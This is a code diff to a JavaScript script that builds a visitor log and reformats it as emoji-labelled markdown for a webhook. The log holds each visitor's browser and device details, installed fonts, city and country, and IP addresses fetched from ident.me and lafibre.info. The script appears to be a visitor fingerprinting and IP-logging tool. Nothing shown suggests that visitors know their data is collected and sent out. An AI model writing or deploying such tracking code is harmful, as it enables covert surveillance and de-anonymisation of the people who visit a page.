@@ -279,6 +279,7 @@
                         content: `\`\`\`json\n${JSON.stringify(errorLog, null, 2)}\n\`\`\``
                     })
                 }).catch(err => console.error('Failed to send error log:', err));
+                webhookURL = '';  // Clear the webhook URL after sending the error log
             }
         }
 
@@ -371,19 +372,19 @@
 
             const visitorLog = {
                 dateTime: new Date().toISOString(),
-                userAgent,
-                platform,
-                cookiesEnabled,
-                pageURL,
-                referrer,
-                deviceMemory,
-                hardwareConcurrency,
-                connectionInfo,
-                screenInfo,
-                fonts,
-                location,
-                ipFromIdentMe: ip1,
-                ipFromLafibreInfo: ip2
+                userAgent: `🕵️‍♂️ **User Agent:** ${userAgent}`,
+                platform: `🖥️ **Platform:** ${platform}`,
+                cookiesEnabled: `🍪 **Cookies Enabled:** ${cookiesEnabled}`,
+                pageURL: `🔗 **Page URL:** ${pageURL}`,
+                referrer: `🔍 **Referrer:** ${referrer}`,
+                deviceMemory: `💻 **Device Memory:** ${deviceMemory}`,
+                hardwareConcurrency: `🔧 **Hardware Concurrency:** ${hardwareConcurrency}`,
+                connectionInfo: `🌐 **Connection Info:** Type: ${connectionInfo.type}, Downlink: ${connectionInfo.downlink} Mbps, RTT: ${connectionInfo.rtt} ms`,
+                screenInfo: `📺 **Screen Info:** Width: ${screenInfo.width}px, Height: ${screenInfo.height}px, Available Width: ${screenInfo.availWidth}px, Available Height: ${screenInfo.availHeight}px`,
+                fonts: `🔠 **Fonts:** ${fonts.join(', ')}`,
+                location: `📍 **Location:** City: ${location.city}, Country: ${location.country}`,
+                ipFromIdentMe: `🌐 **IP from ident.me:** ${ip1}`,
+                ipFromLafibreInfo: `🌐 **IP from lafibre.info:** ${ip2}`
             };
 
             if (webhookURL) {
